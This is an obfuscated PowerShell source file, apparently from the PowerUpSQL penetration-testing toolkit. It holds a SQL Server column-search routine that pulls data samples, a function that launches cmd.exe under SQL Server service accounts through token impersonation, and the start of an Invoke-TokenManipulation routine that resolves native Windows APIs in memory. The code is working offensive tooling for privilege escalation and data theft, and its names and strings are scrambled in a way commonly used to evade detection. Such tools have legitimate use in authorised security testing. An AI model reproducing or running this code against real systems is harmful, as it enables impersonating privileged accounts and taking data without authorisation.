        ${i`S`EXpLo`i`TabLe} = 'No'
        ${e`XP`lOi`TED}     = 'No'
        ${ExP`LOit`CMd}    = ('Inv'+'o'+'ke-SQLAu'+'ditSampl'+'e'+'D'+'at'+'aByC'+'o'+'lumn'+' '+'-I'+'nsta'+'nce '+"$Instance "+'-E'+'xploi'+'t')
        ${D`ETaI`Ls}       = ''
        ${REFe`REN`ce}     = ("{10}{11}{1}{2}{4}{3}{9}{5}{6}{0}{8}{7}"-f'm/','d','n.','cros','mi','ft.c','o','us/library/ms188348.aspx','en-','o','https://','ms')
        ${a`UThoR}        = ("{11}{2}{12}{0}{6}{3}{1}{4}{10}{8}{5}{7}{9}" -f'and (@_n','),','c','llbind',' ','PI 20','u','1','tS','6','Ne','S','ott Sutherl')

        
        
        
        
        &("{1}{2}{4}{3}{0}" -f 'e','Wri','te-Ve','os','rb') -Message ("$Instance "+': '+'- '+'S'+'earching'+' '+'f'+'or '+'colum'+'n'+' '+'na'+'mes '+'tha'+'t '+'ma'+'tch '+'c'+'riter'+'ia..'+'.')
        ${COLU`MnS} = &("{0}{3}{2}{1}"-f'Get-SQL','n','m','Colu') -Instance ${InST`An`cE} -Username ${USe`Rn`AMe} -Password ${pasSW`O`Rd} -Credential ${CRe`D`ENTIal} -ColumnNameSearch ${K`E`YwoRd} -NoDefaults -SuppressVerbose
        if(${coluM`NS})
        {
            ${iSV`ULneR`Ab`Le}  = 'Yes'
        }
        else
        {
            ${IS`VuLN`Era`BlE}  = 'No'
        }

        
        
        
        
        if(${I`SvuLne`RABle} -eq 'Yes')
        {
            
            ${ColU`MNs}|
            &("{1}{2}{0}"-f't','ForEa','ch-Objec') -Process {
                ${DAt`A`Bas`eNaME} = ${_}."daTAb`ASENA`me"
                ${SChe`M`ANA`me} = ${_}."ScHem`AnA`mE"
                ${TA`BL`eNAME} = ${_}."Tab`lEName"
                ${cO`lu`MNnA`me} = ${_}."cOlUm`N`NaMe"
                ${aFfec`T`EDCoL`Umn} = "[$DatabaseName].[$SchemaName].[$TableName].[$ColumnName]"
                ${Af`FectE`dtABLe} = "[$DatabaseName].[$SchemaName].[$TableName]"
                ${Q`U`ERY} = ('USE'+' '+"$DatabaseName; "+'S'+'EL'+'ECT '+'T'+'OP '+"$SampleSize "+"[$ColumnName] "+'FRO'+'M '+"$AffectedTable "+'')

                &("{1}{2}{3}{0}"-f 'rbose','Wr','it','e-Ve') -Message ("$Instance "+': '+'- '+'Col'+'u'+'mn '+'ma'+'tch: '+"$AffectedColumn")

                
                
                
                
                if(${I`sv`UlN`eRa`BLe} -eq 'Yes')
                {
                    ${t`BlTARGET`C`OL`UMns} |
                    &("{2}{3}{0}{1}" -f '-Objec','t','F','orEach') -Process {
                        
                        &("{0}{2}{1}" -f 'Wr','-Verbose','ite') -Message ("$Instance "+': '+'- '+'EXPL'+'OITI'+'NG:'+' '+'Selecti'+'n'+'g '+'data'+' '+'sa'+'mple '+'from'+' '+'co'+'lumn'+' '+"$AffectedColumn.")

                        
                        ${Dat`ASAmp`le} = &("{3}{2}{0}{1}"-f'QLQue','ry','-S','Get') -Instance ${iN`s`TA`NCE} -Username ${uSErn`A`Me} -Password ${P`ASsW`OrD} -Credential ${CR`eDe`NTIAL} -Query ${QU`ERy} -SuppressVerbose |
                        &("{0}{3}{1}{2}"-f'Conv','tTo-','Csv','er') -NoTypeInformation |
                        &("{3}{1}{4}{0}{2}"-f'je','lect-','ct','Se','Ob') -Skip 1
                        if(${da`TaS`A`MPLE})
                        {
                            ${DE`T`Ails} = ('Data'+' '+'sample'+' '+'from'+' '+"$AffectedColumn "+': '+"$DataSample.")
                        }
                        else
                        {
                            ${dEt`AILS} = ('No'+' '+'dat'+'a '+'fo'+'und'+' '+'in'+' '+'af'+'fec'+'ted '+'colu'+'mn: '+"$AffectedColumn.")
                        }
                        ${iSEx`PloitA`B`lE} = 'Yes'
                        ${eX`PLoiT`ed} = 'Yes'

                        
                        ${N`ULl} = ${TbL`DatA}."RO`wS".("{1}{0}"-f'dd','A').Invoke(${C`ompUt`e`RN`Ame}, ${iN`sTa`N`ce}, ${v`ULnE`RAb`iLiTY}, ${dE`Scr`iP`TIon}, ${RemEd`Iati`On}, ${sE`VE`RITY}, ${isVulnE`RAB`le}, ${IseXPl`o`ITA`BLE}, ${E`xP`lOITEd}, ${e`XplOi`T`cMd}, ${De`Ta`ilS}, ${refERe`N`Ce}, ${A`Ut`Hor})
                    }
                }
                else
                {
                    
                    ${de`Ta`iLs} = ('A'+'ffecte'+'d '+'column'+':'+' '+"$AffectedColumn.")
                    ${is`eX`plOiT`AB`Le} = 'Yes'
                    ${Nu`ll} = ${Tb`lDA`TA}."ro`ws".("{0}{1}" -f'A','dd').Invoke(${COmpUT`e`R`Name}, ${in`Sta`NCe}, ${VuLnER`AbI`L`ItY}, ${dEsC`RI`pTIoN}, ${R`eM`eDIatION}, ${Se`VE`RiTY}, ${is`V`Ul`NErabLE}, ${iS`e`XploITaBlE}, ${E`xp`L`oItEd}, ${E`XP`lOI`TCmD}, ${de`T`AILs}, ${reFEr`E`NCe}, ${a`Uth`oR})
                }
            }
        }
        else
        {
            &("{2}{0}{1}" -f 'e-Verbos','e','Writ') -Message ("$Instance "+': '+'- '+'No'+' '+'c'+'o'+'lumns '+'w'+'ere '+'f'+'o'+'und '+'th'+'at '+'m'+'atch'+'ed '+'the'+' '+'sear'+'ch'+'.')
        }

        
        &("{3}{0}{2}{1}" -f 'rite','rbose','-Ve','W') -Message ("$Instance "+': '+'CO'+'M'+'PLETED '+'VU'+'LNE'+'RA'+'BIL'+'ITY '+'C'+'H'+'ECK: '+'SEAR'+'C'+'H '+'DATA'+' '+'B'+'Y '+'COLUM'+'N')
    }

    End
    {
        
        if ( -not ${no`OU`TPuT})
        {
            Return ${T`BLdA`TA}
        }
    }
}







Function i`N`Voke-sQliMP`erS`o`NatESer`ViceCMD
{
    
    [CmdletBinding()]
    Param(
        [Parameter(ManDaTOrY = ${fAL`SE},
                VaLueFROMPiPelINebYPROPERtYNamE = ${tr`UE},
        HElPMESsaGE = {"{7}{4}{2}{0}{10}{1}{6}{3}{9}{5}{8}" -f' ',' t','Server',' ',' ','ion t','o','SQL','o.','connect','instance'})]
        [string]${ins`T`AN`cE},

        [Parameter(MAndAtorY = ${F`A`LsE},
                vaLuEFrompipELINEbyproPertyNAME = ${T`Rue},
        heLpMEsSage = {"{3}{4}{2}{9}{11}{12}{5}{1}{7}{6}{10}{0}{8}{13}" -f'r','ms','cutable to ru','E','xe',' Ss','xe ','.e','ecommen','n.','are ',' Cmd.exe',' and','ded.'})]
        [string]${e`xe} = ("{0}{1}{2}" -f'c','md.','exe'),

        [Parameter(maNdATorY = ${faL`se},
                VaLuEfRoMpiPELiNeBYpropERtyNamE = ${T`RUe},
        HeLpMEssagE = {"{5}{6}{7}{19}{13}{11}{1}{12}{3}{9}{10}{18}{0}{14}{20}{17}{2}{8}{4}{16}{15}"-f 'xt of SQL',' ','servic','e ','cc','Only r','un',' co','e a','con','t','in','th',' ',' Server','ts.','oun','ne ','e','mmands',' database engi'})]
        [switch]${enGI`NeO`NLY}
    )

    Begin {
        
        
        
        &("{1}{2}{0}" -f 'erbose','Write-','V') ("{9}{10}{8}{6}{2}{11}{5}{4}{1}{7}{0}{3}" -f '.','ile','at','..','riv',' p','r','ges','dminsit','Verifying local ','a','or')
        ${C`U`RrEnTId`E`Nt`ItY} =  (  varIaBlE  ("ut"+"NjP")  -vAlUE )::("{3}{1}{2}{0}" -f 'nt','tCurr','e','Ge').Invoke()
        ${P`Rp} = &("{1}{0}{2}"-f'ew-Obje','N','ct') -TypeName ("{6}{4}{3}{1}{8}{9}{2}{10}{5}{7}{0}" -f'l','.Princi','l','y','em.Securit','i','Syst','ndowsPrincipa','p','a','.W') -ArgumentList (${Cu`RreNti`dENt`ItY})
        ${A`dm} =  ( GCI ("VAriA"+"bLE:mG"+"i") ).vALue::"aDMINI`St`R`A`TOr"
        ${is`A`dmin} = ${p`RP}.("{1}{0}"-f 'sInRole','I').Invoke(${A`dM})
        if(${i`saDm`iN}){
             &("{2}{0}{3}{1}"-f'rite-V','ose','W','erb') ("{4}{2}{10}{1}{3}{6}{0}{7}{9}{8}{5}"-f ' has lo','ent ','r','u','The cu','eges.','ser','cal administrator pri','il','v','r')
        }else{
             &("{3}{0}{1}{2}"-f'rite-','Verbo','se','W') ("{2}{1}{4}{11}{8}{13}{5}{6}{7}{12}{10}{0}{9}{3}"-f'ge','S NO','The current user DOE','g.','T ','d','minist','r',' l','s. Abortin','ile','have','ator priv','ocal a')
             return
        }
    }

    Process {

        
        &("{0}{2}{1}"-f'Wr','e-Host','it') ("{6}{10}{11}{14}{1}{4}{7}{8}{2}{16}{15}{5}{3}{12}{0}{9}{13}"-f ' need ','bo','ag','ou more i','se ','e y','Not','f','l','i','e: T','he ve','nfo if you','t.','r','ll giv',' wi')

        
        &("{3}{2}{4}{1}{0}" -f'ose','b','i','Wr','te-Ver') ("{5}{7}{13}{0}{8}{12}{4}{2}{15}{11}{10}{6}{1}{3}{9}{14}"-f 'i','ces runn','L','ing locall','f SQ','Gat','r servi','he','s','y.','e','Serv','t o','ring l','..',' ')
        if(${EnGI`NE`ON`ly}){
            ${LoCAL`sqLs`ErVIc`Es} = &("{3}{2}{5}{0}{4}{1}"-f'vi','l','Q','Get-S','ceLoca','LSer') -Instance ${InSt`ANCE} -RunOnly | &("{1}{2}{0}"-f 'Object','Whe','re-') {${_}."servic`eP`ATh" -like ("{1}{3}{2}{0}" -f'xe*','*','lservr.e','sq')}  | &("{1}{0}{2}" -f 'ort','S','-Object') ("{2}{1}{0}" -f 'ance','nst','I')
            &("{1}{0}{3}{2}" -f 'rite-V','W','ose','erb') ("{11}{2}{4}{10}{1}{5}{0}{6}{8}{9}{7}{3}" -f 'gine service acco','base ','y the ','rgeted.','dat','en','u','a','nts will b','e t','a','Onl')
        }else{
            ${l`oCa`lSQLSe`Rv`IcES} = &("{3}{1}{0}{4}{2}"-f'vi','LSer','l','Get-SQ','ceLoca') -Instance ${i`NStA`NcE} -RunOnly | &("{2}{0}{1}" -f '-Obj','ect','Sort') ("{0}{2}{1}" -f'Inst','ce','an')
        }

        
        &("{3}{2}{0}{1}"-f 'erbos','e','te-V','Wri') ("{0}{1}{2}{4}{3}{5}{6}" -f 'G','ather','i','st','ng li',' of local processes.','..')
        ${l`OC`A`L`prOCESsES} = &("{2}{4}{1}{3}{0}" -f'ject','O','Get-','b','Wmi') -Class ("{2}{0}{3}{1}" -f '2_proce','s','win3','s') | &("{0}{2}{3}{1}"-f'Se','ct','l','ect-Obje') ("{1}{0}{2}"-f 'ss','proce','id'),("{2}{0}{1}{3}"-f't','abl','Execu','ePath')
        
        &("{1}{2}{0}" -f 'se','Wr','ite-Verbo') ("{7}{3}{8}{1}{6}{2}{5}{0}{4}"-f 'es','in',' SQL Serve','ar','ses...','r proc','g','T','get')        

        
        ${l`ocA`LsQ`LsERv`Ic`es} |
        &("{2}{0}{1}{3}" -f'orEach-Obj','ec','F','t') {
            
            ${S`_patHn`Ame} = ${_}."S`eR`V`ICEpath".("{0}{1}"-f 'S','plit').Invoke("`"")[1]
            ${s_diSp`L`A`ynaMe} = ${_}."ser`VI`cEdI`spLa`YnaME"
            ${s`_s`erVi`ceAcC`oUNT} = ${_}."se`RvIC`EA`c`COUnt"   
            ${S_i`NStA`NCe} = ${_}."InS`T`Ance"  
                        
            
            ${L`o`CAlp`RoCESs`ES} | 
            &("{1}{3}{2}{4}{0}" -f'ct','Fo','a','rE','ch-Obje') {
  
                ${P`_exe`Cu`TABLEpATh} = ${_}."e`xEc`UT`Ab`lePAtH"
                ${P`_PRoCEs`S`id} = ${_}."PR`o`cESsiD"

                
                if(${s_pat`H`NA`Me} -like "$p_ExecutablePath"){

                    &("{2}{0}{1}{3}"-f 'it','e','Wr','-Host') ("$s_instance "+'- '+'Serv'+'i'+'c'+'e: '+"$s_displayname "+'- '+'Ru'+'n'+'ning '+'com'+'mand '+"`"$Exe`" "+'as'+' '+"$s_serviceaccount")

                    
                    ${MY`C`Md} = ('/'+'C '+"$Exe")

                    
                    &("{3}{4}{0}{5}{2}{1}"-f'ke','ion','TokenManipulat','I','nvo','-') -CreateProcess ("{1}{2}{0}" -f'.exe','c','md') -ProcessArgs ${m`YcMd} -ProcessId ${P_PRoC`E`ss`Id} -ErrorAction ("{1}{0}{2}{5}{4}{3}"-f 'il','S','entlyC','ue','in','ont')

                    
                }
            }               
        }               
    }

    End {
    
        
        &("{2}{1}{0}"-f't','e-Hos','Writ') ("{1}{0}" -f'e.','All don')
    }
}















function INVo`kE-`TOKen`m`ANI`Pulat`Ion
{


    [CmdletBinding(dEfAUltPArametErsETNaME={"{2}{0}{1}" -f'umer','ate','En'})]
    Param(
        [Parameter(PaRamEtErSeTnAME = "ENuMERa`TE")]
        [Switch]
        ${EN`UmERa`Te},

        [Parameter(PARamEtersetnAmE = "Re`V`TosELf")]
        [Switch]
        ${Rev`T`os`eLf},

        [Parameter(pARaMEtErsEtNAme = "s`H`OWalL")]
        [Switch]
        ${s`h`oWaLL},

        [Parameter(parAmeTErSeTNAME = "I`MPe`RsOnATEu`sER")]
        [Switch]
        ${Im`pE`RsoNaT`eUSer},

        [Parameter(pARamETErSETNAMe = "CRE`At`epRocESS")]
        [String]
        ${crEAtE`PR`oCESs},

        [Parameter(PArAmeteRsETNAmE = "WHO`AmI")]
        [Switch]
        ${WH`oAmI},

        [Parameter(paramEteRSEtName = "impeRsoN`At`eu`s`ER")]
        [Parameter(ParaMetERSetnAMe = "Cre`ATePr`OCe`SS")]
        [String]
        ${USer`N`AmE},

        [Parameter(paRameTERseTname = "im`p`eRs`o`NAtEUSER")]
        [Parameter(pARameTErSeTNAme = "cr`Ea`TEP`Roc`ess")]
        [Int]
        ${p`Roc`ES`sid},

        [Parameter(PaRamEterSETNaME = "I`mPe`R`SonAT`EusER", vALuefROMPipeline=${tr`Ue})]
        [Parameter(paRAMEtErsETnaME = "c`ReAtep`Ro`ceSS", vAlUeFrOMpipelInE=${tr`UE})]
        [System.Diagnostics.Process]
        ${PR`oCE`ss},

        [Parameter(ParAmeTERseTNamE = "IM`PERsOn`AtEuS`ER")]
        [Parameter(pARaMETersetNAme = "CREa`Tep`RoC`e`Ss")]
        ${tH`RE`ADId},

        [Parameter(paraMETERsETname = "c`Re`ATEpRocESs")]
        [String]
        ${PRo`C`essAr`gs},

        [Parameter(PArAMETersEtnamE = "CreAtepR`O`cEss")]
        [Switch]
        ${n`OuI},

        [Parameter(ParAMetErSetNAME = "CrEAt`E`prOCESs")]
        [Switch]
        ${PAs`stH`Ru},

        [Parameter(manDATORy = ${Fa`L`SE},vALuEFroMpiPElInEBYpROpErTyNaMe = ${t`RUe},
        HELpMEssagE = {"{4}{6}{5}{2}{3}{0}{1}" -f 'ce',' to connection to.','ns','tan','S','i','QL Server '})]
        [string]${i`N`sTaNCe}
    )
   
    &("{1}{2}{0}" -f 'e','Set-Stric','tMod') -Version 2

	
	Function gEt-`DE`lEGaTETYPe
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( pOsITion = 0)]
	        [Type[]]
	        ${PAR`AME`TeRs} = (&("{0}{2}{3}{1}" -f'N','ct','ew-Ob','je') ("{1}{0}"-f'pe[]','Ty')(0)),
	        
	        [Parameter( pOsITION = 1 )]
	        [Type]
	        ${r`eTurNt`YpE} = [Void]
	    )

	    ${Dom`Ain} =   (Dir ("varIABle:"+"r"+"M"+"b2") ).vaLUE::"cUR`RenTDo`mAiN"
	    ${DYN`A`SsEmb`lY} = &("{0}{1}{2}"-f'New-Ob','jec','t') ("{3}{6}{2}{7}{1}{0}{5}{4}" -f 'Na','embly','on.As','System.Refl','e','m','ecti','s')(("{2}{3}{1}{0}"-f'ctedDelegate','e','Re','fl'))
	    ${asSE`MBlY`BUi`ld`eR} = ${D`OMA`In}."dEFineD`Y`Na`MIcAS`sEm`BlY"(${DYN`As`s`EMBly},   (childiTEM  vARiAblE:aQ0mZv ).VALue::"r`UN")
	    ${m`odU`LEbUi`lDeR} = ${A`s`sEmB`LyBuILdEr}.("{1}{0}{2}{4}{3}"-f 'a','DefineDyn','m','dule','icMo').Invoke(("{2}{3}{0}{1}" -f'oryModu','le','I','nMem'), ${Fa`LSE})
	    ${T`y`pEbui`LdeR} = ${MOdUlE`B`UI`lDER}.("{2}{1}{0}{3}" -f'ineTy','ef','D','pe').Invoke(("{3}{0}{2}{1}"-f 'yDelega','ype','teT','M'), ("{4}{5}{11}{7}{9}{8}{2}{0}{6}{3}{10}{1}"-f', Aut','s','Class','Cla','Class,',' Publ','o',', Sea','ed, Ansi','l','s','ic'), [System.MulticastDelegate])
	    ${COnStRUCTorB`U`ilD`er} = ${t`YPEbU`ILd`Er}.("{1}{3}{4}{2}{0}" -f 'tor','Defi','ruc','neCo','nst').Invoke(("{1}{3}{0}{4}{7}{5}{2}{6}"-f 'eci','R','ySig,','TSp','a','Name, HideB',' Public','l'),  (  GET-VARIABlE  ('d'+'74VsW')  -VaLUEONl)::"st`ANda`Rd", ${Par`A`m`eteRS})
	    ${CON`STRu`ctO`RB`UiLDEr}.("{5}{1}{0}{2}{3}{4}"-f 'mple','tI','men','ta','tionFlags','Se').Invoke(("{0}{3}{4}{1}{2}" -f'Runtim','a','ged','e,',' Man'))
	    ${MeThodB`Ui`lDEr} = ${t`ype`BUiLDER}.("{2}{0}{1}"-f'i','neMethod','Def').Invoke('Invoke', ("{5}{6}{3}{4}{2}{1}{0}" -f'rtual','lot, Vi','S','ySi','g, New','Public, ','HideB'), ${r`ET`U`RntYPE}, ${p`ARAM`ETerS})
	    ${m`eT`HOdbU`IlDER}.("{6}{4}{0}{2}{3}{1}{5}"-f'lem','tionFlag','e','nta','tImp','s','Se').Invoke(("{3}{1}{0}{2}" -f ', Manag','untime','ed','R'))
	    
	    &("{0}{1}{2}"-f'Write-','Ho','st') ${TYpEb`UiL`dER}.("{0}{2}{1}"-f'C','eateType','r').Invoke()
	}


	
	Function g`e`T-`proCad`DrEsS
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( pOSItion = 0, maNDaTory = ${tr`UE} )]
	        [String]
	        ${M`oDU`lE},
	        
	        [Parameter( POsITIoN = 1, ManDATOry = ${tr`Ue} )]
	        [String]
	        ${PRO`C`eDURe}
	    )

	    
	    ${sYsTe`mAssEm`B`LY} =  (  dir ("vArIa"+"blE:R"+"Mb2")  ).value::"CURreNT`DoM`A`iN".("{0}{1}{2}"-f'Ge','tAssemb','lies').Invoke() |
	        &("{1}{2}{0}" -f'bject','W','here-O') { ${_}."GlobAlA`sSEmblYCa`c`HE" -And ${_}."lOCATi`ON".("{1}{0}"-f't','Spli').Invoke('\\')[-1].("{1}{0}"-f 'quals','E').Invoke(("{2}{0}{1}"-f 'e','m.dll','Syst')) }
	    ${UnS`Af`en`ATivEm`EThods} = ${sySTeM`ASSe`mB`ly}.("{2}{1}{0}"-f'tType','e','G').Invoke(("{1}{4}{5}{0}{2}{8}{7}{6}{3}" -f'ft.W','M','in3','hods','icr','oso','NativeMet','.Unsafe','2'))
	    
	    ${ge`TmOd`UlEHanD`lE} = ${UNsAf`eN`At`Ive`mE`THo`Ds}.("{1}{0}" -f 'ethod','GetM').Invoke(("{2}{1}{3}{0}"-f'eHandle','etMod','G','ul'))
	    ${g`eTp`ROCaD`D`ReSs} = ${un`s`AFE`NA`TIvEMe`T`hOds}.("{2}{3}{0}{1}"-f 'h','od','GetM','et').Invoke(("{3}{2}{4}{1}{0}" -f'ess','ddr','tPr','Ge','ocA'))
	    
	    ${kErN3`2HanD`le} = ${gET`mo`dULe`haNdle}."I`N`VOke"(${N`ULl}, @(${MO`D`Ule}))
	    ${tmp`PTR} = &("{1}{0}{2}{3}"-f'Obje','New-','c','t') ("{0}{1}"-f 'Int','Ptr')
	    ${ha`NdL`ErEF} = &("{2}{0}{1}" -f'Obje','ct','New-') ("{0}{4}{1}{2}{5}{8}{7}{9}{3}{10}{6}" -f 'Syste','.','Runtime.I','ces.Han','m','n','leRef','r','teropSe','vi','d')(${T`M`pptr}, ${k`ERN`32h`A`NDLe})

	    
	    &("{3}{0}{1}{2}" -f'it','e-','Host','Wr') ${G`eTPrOCa`DdR`e`ss}."IN`VOkE"(${nu`lL}, @([System.Runtime.InteropServices.HandleRef]${hAnD`L`e`REF}, ${P`ROceDu`Re}))
	}

    
    
    
    ${c`O`NstANTS} = @{
        ("{2}{3}{0}{4}{1}{6}{5}" -f'ESS','STEM_','AC','C','_SY','ECURITY','S') = 0x01000000
        ("{0}{1}{3}{2}"-f'RE','AD_C','L','ONTRO') = 0x00020000
        ("{1}{2}{0}" -f'HRONIZE','SY','NC') = 0x00100000
        ("{4}{6}{3}{5}{0}{1}{2}"-f 'GHTS','_AL','L','R','STAN','I','DARD_') = 0x001F0000
        ("{0}{3}{1}{2}" -f 'TOKE','R','Y','N_QUE') = 8
        ("{0}{2}{5}{1}{6}{3}{4}" -f'T','U','OKEN','R','IVILEGES','_ADJ','ST_P') = 0x20
        ("{2}{1}{3}{0}"-f 'EN','OR_NO_TO','ERR','K') = 0x3f0
        ("{4}{1}{2}{0}{3}"-f 'TY_DELEGATI','UR','I','ON','SEC') = 3
        ("{4}{2}{1}{3}{0}" -f 'N','L_SECU','AC','RITY_INFORMATIO','D') = 0x4
        ("{5}{3}{1}{2}{4}{0}"-f'E_TYPE','OWED','_A','CESS_ALL','C','AC') = 0x0
        ("{5}{3}{4}{6}{2}{0}{1}"-f'_REQUIR','ED','IGHTS','D','ARD_','STAN','R') = 0x000F0000
        ("{0}{1}{2}{4}{5}{3}"-f'D','E','SK','C_ALL','TOP_G','ENERI') = 0x000F01FF
        ("{1}{0}{2}"-f '_','WRITE','DAC') = 0x00040000
        ("{3}{0}{1}{2}" -f'E','RIT_','ACE','OBJECT_INH') = 0x1
        ("{1}{2}{0}{3}"-f 'ES','GRANT','_ACC','S') = 0x1
        ("{1}{0}{3}{2}{4}"-f'IS_N','TRUSTEE_','M','A','E') = 0x1
        ("{0}{2}{1}{4}{3}" -f'T','U','R','_IS_SID','STEE') = 0x0
        ("{2}{1}{0}"-f'USER','_IS_','TRUSTEE') = 0x1
        ("{0}{1}{3}{5}{4}{2}"-f 'T','RUSTEE_IS','N_GROUP','_W','KNOW','ELL_') = 0x5
        ("{0}{4}{3}{2}{1}" -f'TR','GROUP','EE_IS_','ST','U') = 0x2
        ("{4}{0}{3}{6}{1}{5}{2}" -f 'ROCES','Y_I','FORMATION','S_Q','P','N','UER') = 0x400
        ("{6}{4}{5}{3}{1}{2}{0}"-f'ARY','RI','M','IGN_P','OKEN','_ASS','T') = 0x1
        ("{1}{4}{0}{3}{2}" -f'N_','T','LICATE','DUP','OKE') = 0x2
        ("{3}{4}{1}{2}{0}"-f 'TE','KEN','_IMPERSONA','T','O') = 0x4
        ("{3}{0}{4}{1}{2}"-f 'KEN_','R','Y_SOURCE','TO','QUE') = 0x10
        ("{3}{0}{1}{2}{4}" -f 'HTS_','R','EA','STANDARD_RIG','D') = 0x20000
        ("{1}{0}{2}"-f 'enSt','Tok','atistics') = 10
        ("{2}{3}{1}{0}" -f 'S','_ALL_ACCES','TOKE','N') = 0xf01ff
        ("{2}{0}{3}{1}{4}"-f'AXIM','M_AL','M','U','LOWED') = 0x02000000
        ("{1}{3}{0}{2}"-f 'D_A','THR','LL_ACCESS','EA') = 0x1f03ff
        ("{2}{4}{1}{0}{3}"-f'AM','AR','ERROR_INVAL','ETER','ID_P') = 0x57
        ("{5}{2}{1}{3}{0}{4}" -f'DENTIA','_NE','ON','TCRE','LS_ONLY','LOG') = 0x2
        ("{4}{5}{2}{0}{1}{3}"-f 'GE_','E','E','NABLED','SE_P','RIVIL') = 0x2
        ("{7}{3}{6}{8}{0}{2}{5}{1}{4}" -f 'AB','EFAUL','L','_P','T','ED_BY_D','R','SE','IVILEGE_EN') = 0x1
        ("{4}{3}{2}{1}{5}{6}{0}" -f'D','ILEGE','RIV','_P','SE','_R','EMOVE') = 0x4
    }

    ${w`IN32`co`Ns`TAnTs} = &("{2}{0}{1}" -f '-Ob','ject','New') ("{0}{1}" -f 'PS','Object') -Property ${Co`N`STantS}
    


    
    
    
	
	
	${D`O`MaIN} =   (ChiLDIteM ("v"+"aRiA"+"bLE:RMB"+"2")).vaLUE::"c`Ur`RENtDo`MAIN"
	${dynAm`ica`ss`EmB`Ly} = &("{0}{2}{1}{3}"-f'New-','c','Obje','t') ("{1}{0}{2}{3}{4}" -f 'ctio','System.Refle','n','.Assem','blyName')(("{0}{1}{2}{3}" -f'Dyn','a','mi','cAssembly'))
	${aSS`emBlyb`UI`ldeR} = ${Do`M`Ain}."DeFIn`eDY`NAmiCA`SSe`mbLY"(${D`yN`Am`IcAsS`Em`BlY},  (  ITeM ('vA'+'rIABl'+'e:aQ0M'+'Zv') ).vAlUe::"r`UN")
	${m`O`d`ULe`BuILder} = ${A`SseMbLYB`UIld`ER}.("{4}{1}{5}{3}{2}{0}"-f 'ule','ineD','d','cMo','Def','ynami').Invoke(("{1}{2}{0}{4}{3}" -f 'ic','D','ynam','ule','Mod'), ${f`ALse})
	${coNStRU`c`To`RInFO} =   $ltYoQ.("{1}{2}{0}" -f 'rs','GetCons','tructo').Invoke()[0]

    
	${tYP`E`BUiLD`ER} = ${Mo`DuLeb`UI`L`DEr}.("{2}{0}{1}"-f 'e','Enum','Defin').Invoke(("{4}{0}{3}{1}{2}"-f 'EN_INFOR','TION_CLA','SS','MA','TOK'), ("{1}{0}" -f 'lic','Pub'), [UInt32])
	${t`y`PEb`UiLDer}.("{3}{2}{1}{0}"-f'teral','Li','fine','De').Invoke(("{0}{2}{1}" -f'Toke','User','n'), [UInt32] 1) | &("{1}{0}" -f't-Null','Ou')
    ${TY`pEbu`IldEr}.("{2}{1}{0}"-f 'al','ter','DefineLi').Invoke(("{2}{0}{1}"-f'kenG','roups','To'), [UInt32] 2) | &("{0}{2}{1}" -f 'O','t-Null','u')
    ${ty`pE`BUIld`er}.("{1}{2}{0}" -f'l','DefineL','itera').Invoke(("{2}{1}{0}{3}"-f'l','Privi','Token','eges'), [UInt32] 3) | &("{1}{0}" -f't-Null','Ou')
    ${ty`p`ebuI`LDer}.("{1}{3}{2}{0}" -f'al','D','fineLiter','e').Invoke(("{2}{0}{1}{3}"-f 'oken','Owne','T','r'), [UInt32] 4) | &("{1}{0}{2}"-f'ul','Out-N','l')
    ${t`YPE`BuI`LdeR}.("{0}{2}{1}{3}{4}" -f'De','Liter','fine','a','l').Invoke(("{0}{3}{4}{2}{1}" -f'Tok','roup','ryG','e','nPrima'), [UInt32] 5) | &("{1}{0}"-f't-Null','Ou')
    ${TYpE`BU`iL`deR}.("{0}{2}{1}"-f'DefineL','l','itera').Invoke(("{0}{3}{1}{2}{4}" -f'Tok','n','Def','e','aultDacl'), [UInt32] 6) | &("{2}{1}{0}" -f't-Null','u','O')
    ${typEb`U`iL`dEr}.("{2}{1}{0}"-f'ral','fineLite','De').Invoke(("{1}{2}{3}{0}"-f'e','Toke','nSo','urc'), [UInt32] 7) | &("{1}{0}{2}"-f'Nul','Out-','l')
    ${tYpe`B`Ui`Lder}.("{1}{2}{3}{0}" -f 'ral','DefineL','it','e').Invoke(("{2}{1}{0}"-f'e','enTyp','Tok'), [UInt32] 8) | &("{2}{1}{0}"-f'ull','N','Out-')
    ${Typ`eB`UILdeR}.("{3}{1}{0}{2}" -f'Lite','ine','ral','Def').Invoke(("{3}{0}{5}{1}{2}{4}{6}"-f 'okenImperson','tion','L','T','eve','a','l'), [UInt32] 9) | &("{1}{2}{0}" -f 'll','O','ut-Nu')
    ${T`yPebUIlD`eR}.("{4}{1}{2}{0}{3}"-f'er','ne','Lit','al','Defi').Invoke(("{4}{0}{1}{2}{3}"-f 'ken','Stati','sti','cs','To'), [UInt32] 10) | &("{2}{0}{1}" -f'u','ll','Out-N')
    ${tyP`eBUild`er}.("{4}{0}{3}{1}{2}"-f'efi','ter','al','neLi','D').Invoke(("{3}{1}{4}{2}{5}{6}{0}" -f 'Sids','R','stric','Token','e','te','d'), [UInt32] 11) | &("{2}{0}{1}"-f'u','ll','Out-N')
    ${t`Y`PebUIlD`Er}.("{1}{0}{2}"-f 'efineLiter','D','al').Invoke(("{0}{2}{1}"-f 'To','nSessionId','ke'), [UInt32] 12) | &("{1}{2}{0}" -f '-Null','O','ut')
    ${TYPe`Bu`i`Lder}.("{2}{1}{0}" -f 'ral','neLite','Defi').Invoke(("{0}{6}{5}{4}{2}{3}{1}{7}" -f 'T','dPri','o','upsAn','nGr','e','ok','vileges'), [UInt32] 13) | &("{1}{2}{0}"-f 'll','Out-','Nu')
    ${TYp`eBui`lDER}.("{0}{2}{4}{3}{1}"-f 'Def','al','ineL','r','ite').Invoke(("{2}{5}{1}{0}{3}{4}"-f'ionRefer','ss','Tok','en','ce','enSe'), [UInt32] 14) | &("{0}{1}{2}" -f 'Out-','N','ull')
    ${tY`PeB`UildEr}.("{0}{1}{2}" -f 'Defin','e','Literal').Invoke(("{1}{2}{4}{0}{3}{5}"-f'oxI','Toke','nSand','ner','B','t'), [UInt32] 15) | &("{1}{0}{2}" -f't-Nul','Ou','l')
    ${TY`pE`BUIlDer}.("{0}{2}{1}"-f'D','neLiteral','efi').Invoke(("{3}{2}{1}{0}{4}"-f'oli','ditP','kenAu','To','cy'), [UInt32] 16) | &("{2}{1}{0}" -f'ull','ut-N','O')
    ${t`Y`PEbuIld`eR}.("{3}{1}{0}{2}" -f'iter','L','al','Define').Invoke(("{0}{1}{2}"-f'Toke','n','Origin'), [UInt32] 17) | &("{1}{0}"-f 'Null','Out-')
